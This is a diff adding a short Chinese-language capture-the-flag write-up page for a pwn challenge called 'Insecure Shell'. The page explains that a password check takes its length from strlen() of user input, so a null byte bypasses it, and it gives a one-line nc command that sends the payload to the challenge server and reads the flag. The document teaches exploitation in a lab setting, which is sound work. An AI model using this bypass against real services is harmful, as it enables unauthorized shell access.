@@ -1,0 +1,36 @@
+---
+title: Insecure Shell
+date: 2025-04-22 02:45:00
+description: Bypassing a password comparison with a zero-length input.
+order: 3
+draft: false
+---
+
+import ChallengeInfo from '@/components/ChallengeInfo.astro'
+
+<ChallengeInfo
+  author="Dr.dog"
+  category="pwn"
+  description="SSH is outdated. ISSH is a more convenient alternative."
+  remote="nc chal.ctf.scint.org 10004"
+  files={[
+    {
+      label: 'insecure_shell.c',
+      href: 'https://github.com/yuto0226/notes/blob/main/public/thjcc-ctf-pwn/insecure_shell.c',
+    },
+  ]}
+/>
+
+## Solution
+
+這題會從 `/dev/urandom` 取出一段 15 bytes 的密碼，使用者必須輸入正確的密碼才能拿到 shell。但仔細閱讀程式碼，可以發現 `check_password()` 傳入的長度是使用者可控的，而不是密碼長度 15。
+
+```c
+check_password(password, buf, strlen(buf))
+```
+
+因此可以直接輸入一個長度 0 的字串繞過檢查，並拿到 shell。
+
+```zsh
+echo -e '\x00\ncat ../flag.txt' | nc chal.ctf.scint.org 10004
+```
